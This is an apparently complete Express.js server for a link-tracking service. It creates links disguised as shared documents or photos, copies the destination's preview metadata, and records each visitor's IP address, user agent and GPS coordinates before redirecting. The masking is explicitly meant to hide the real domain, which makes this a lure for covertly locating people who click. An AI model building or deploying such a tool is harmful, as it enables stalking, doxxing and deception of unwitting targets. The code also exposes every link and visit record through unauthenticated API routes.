const express = require('express');
const { nanoid } = require('nanoid');
const mongoose = require('mongoose');
const path = require('path');
const cors = require('cors');
const dotenv = require('dotenv');
const getMetaData = require('metadata-scraper');
const fetch = require('node-fetch');
const fs = require('fs');

// Load environment variables
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB connection
mongoose.connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
})
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('MongoDB connection error:', err));

// MongoDB Schema and Models
const linkSchema = new mongoose.Schema({
    id: { type: String, required: true, unique: true },
    name: { type: String, required: true },
    custom_url: { type: String },
    custom_slug: { type: String },
    created_at: { type: Date, default: Date.now }
});

const visitSchema = new mongoose.Schema({
    link_id: { type: String, required: true, ref: 'Link' },
    latitude: { type: Number },
    longitude: { type: Number },
    ip_address: { type: String },
    user_agent: { type: String },
    visited_at: { type: Date, default: Date.now }
});

const Link = mongoose.model('Link', linkSchema);
const Visit = mongoose.model('Visit', visitSchema);

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(express.static('public'));

// Fungsi untuk mendapatkan metadata dari URL
async function fetchUrlMetadata(url) {
    try {
        const metadata = await getMetaData(url);
        return {
            title: metadata.title || 'Shared Link',
            description: metadata.description || 'Click to open the link',
            image: metadata.image || '',
            url: url
        };
    } catch (error) {
        console.error('Error fetching metadata:', error);
        return {
            title: 'Shared Link',
            description: 'Click to open the link',
            image: '',
            url: url
        };
    }
}

// Fungsi untuk merender template HTML dengan metadata
function renderTemplate(templatePath, data) {
    let template = fs.readFileSync(templatePath, 'utf8');

    // Ganti placeholder dengan nilai sebenarnya
    Object.keys(data).forEach(key => {
        const placeholder = new RegExp(`{{${key}}}`, 'g');
        template = template.replace(placeholder, data[key]);
    });

    return template;
}

// API Routes

// Create a new tracking link
app.post('/api/links', async (req, res) => {
    try {
        const { name, customUrl, customSlug } = req.body;
        const id = customSlug || nanoid(8); // Use custom slug if provided, otherwise generate one

        console.log('Creating link:', { name, customUrl, customSlug, id });

        // Check if custom slug already exists
        if (customSlug) {
            const existingLink = await Link.findOne({ id: customSlug });
            if (existingLink) {
                return res.status(400).json({ error: 'Custom slug already in use. Please choose another one.' });
            }
        }

        // Create new link
        const link = new Link({
            id,
            name,
            custom_url: customUrl || null,
            custom_slug: customSlug || null
        });

        await link.save();

        // Generate tracking URLs
        const baseUrl = process.env.BASE_URL || (req.protocol + '://' + req.get('host'));
        const standardTracking = `${baseUrl}/t/${id}`;

        // Generate masked URLs that don't reveal the actual domain
        const maskedUrl = `${baseUrl}/file/shared-document-${id.substring(0, 4)}.html`;
        const photoUrl = `${baseUrl}/photo/view-${id}.html`;

        const response = {
            id,
            name,
            custom_url: customUrl || null,
            url: standardTracking,
            masked_urls: {
                file: maskedUrl,
                photo: photoUrl
            }
        };

        console.log('Response:', response);
        res.status(201).json(response);
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get all links
app.get('/api/links', async (req, res) => {
    try {
        const links = await Link.find().sort({ created_at: -1 });

        // Add masked URLs to each link
        const baseUrl = process.env.BASE_URL || (req.protocol + '://' + req.get('host'));
        const linksWithUrls = links.map(link => {
            return {
                ...link.toObject(),
                url: `${baseUrl}/t/${link.id}`,
                masked_urls: {
                    file: `${baseUrl}/file/shared-document-${link.id.substring(0, 4)}.html`,
                    photo: `${baseUrl}/photo/view-${link.id}.html`
                }
            };
        });

        res.json(linksWithUrls);
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Get a specific link with its visits
app.get('/api/links/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Link.findOne({ id });

        if (!link) {
            return res.status(404).json({ error: 'Link not found' });
        }

        const visits = await Visit.find({ link_id: id }).sort({ visited_at: -1 });

        const baseUrl = process.env.BASE_URL || (req.protocol + '://' + req.get('host'));
        const response = {
            ...link.toObject(),
            url: `${baseUrl}/t/${link.id}`,
            masked_urls: {
                file: `${baseUrl}/file/shared-document-${link.id.substring(0, 4)}.html`,
                photo: `${baseUrl}/photo/view-${link.id}.html`
            },
            visits
        };

        res.json(response);
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Record a visit with location data
app.post('/api/track/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const { latitude, longitude } = req.body;
        const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const user_agent = req.headers['user-agent'];

        const visit = new Visit({
            link_id: id,
            latitude,
            longitude,
            ip_address,
            user_agent
        });

        await visit.save();
        res.status(201).json({ success: true });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Redirect based on custom URL if available
app.get('/t/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Link.findOne({ id });

        if (!link) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        if (link.custom_url) {
            // Fetch metadata dari URL tujuan
            const metadata = await fetchUrlMetadata(link.custom_url);

            // Render template dengan metadata
            const htmlContent = renderTemplate(
                path.join(__dirname, 'public', 'track.html'),
                {
                    og_title: metadata.title,
                    og_description: metadata.description,
                    og_image: metadata.image,
                    og_url: metadata.url,
                    redirect_url: link.custom_url
                }
            );

            // Kirim HTML yang sudah dirender
            res.send(htmlContent);
        } else {
            res.sendFile(path.join(__dirname, 'public', 'tracker.html'));
        }
    } catch (error) {
        console.error('Server error:', error);
        res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }
});

// Handle file route for masked URLs
app.get('/file/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const idMatch = filename.match(/shared-document-(.{4})\.html/);

        if (!idMatch) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        const idPrefix = idMatch[1];

        // Find link with matching ID prefix
        const links = await Link.find();
        const matchedLink = links.find(link => link.id.startsWith(idPrefix));

        if (!matchedLink) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        if (matchedLink.custom_url) {
            // Fetch metadata dari URL tujuan
            const metadata = await fetchUrlMetadata(matchedLink.custom_url);

            // Render template dengan metadata
            const htmlContent = renderTemplate(
                path.join(__dirname, 'public', 'track.html'),
                {
                    og_title: metadata.title,
                    og_description: metadata.description,
                    og_image: metadata.image,
                    og_url: metadata.url,
                    redirect_url: matchedLink.custom_url
                }
            );

            // Kirim HTML yang sudah dirender
            res.send(htmlContent);
        } else {
            res.redirect(`/track.html?id=${matchedLink.id}&type=file`);
        }
    } catch (error) {
        console.error('Server error:', error);
        res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }
});

// Handle photo route for masked URLs
app.get('/photo/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const idMatch = filename.match(/view-(.+)\.html/);

        if (!idMatch) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        const id = idMatch[1];

        // Verify link exists
        const link = await Link.findOne({ id });
        if (!link) {
            return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
        }

        if (link.custom_url) {
            // Fetch metadata dari URL tujuan
            const metadata = await fetchUrlMetadata(link.custom_url);

            // Render template dengan metadata
            const htmlContent = renderTemplate(
                path.join(__dirname, 'public', 'track.html'),
                {
                    og_title: metadata.title,
                    og_description: metadata.description,
                    og_image: metadata.image,
                    og_url: metadata.url,
                    redirect_url: link.custom_url
                }
            );

            // Kirim HTML yang sudah dirender
            res.send(htmlContent);
        } else {
            res.redirect(`/track.html?id=${id}&type=photo`);
        }
    } catch (error) {
        console.error('Server error:', error);
        res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    }
});

// Delete a tracking link
app.delete('/api/links/:id', async (req, res) => {
    try {
        const { id } = req.params;

        // Find and delete the link
        const link = await Link.findOneAndDelete({ id });

        if (!link) {
            return res.status(404).json({ error: 'Link not found' });
        }

        // Delete all visits associated with this link
        await Visit.deleteMany({ link_id: id });

        res.json({ success: true, message: 'Link and associated visits deleted successfully' });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Serve the main app for any other routes
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// For Vercel, we need to export the Express app
module.exports = app;

// Only start the server if this file is run directly
if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`Server running on http://localhost:${PORT}`);
    });
} 